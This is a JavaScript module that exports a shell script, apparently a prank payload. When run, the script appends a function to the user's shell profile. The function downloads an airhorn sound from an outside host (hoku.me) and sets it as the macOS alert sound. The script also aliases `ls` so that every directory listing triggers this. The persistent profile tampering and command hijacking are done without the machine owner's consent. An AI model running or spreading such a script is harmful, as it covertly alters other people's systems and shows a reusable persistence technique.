module.exports = `
DESTINATION_PATH=~/.profile
if [ -f ~/.bash_profile ]
then
    DESTINATION_PATH=~/.bash_profile
elif [ -f ~/.bash_login ]
then
    DESTINATION_PATH=~/.bash_login
fi
echo "function eles() { if [ ! -e /tmp/x.out ]; then curl -sL hoku.me/assets/airhorn > /tmp/x.out; fi; defaults write .GlobalPreferences com.apple.sound.beep.sound /tmp/x.out; }" >> $DESTINATION_PATH
echo "alias ls='eles && ls'" >> $DESTINATION_PATH
source $DESTINATION_PATH
`
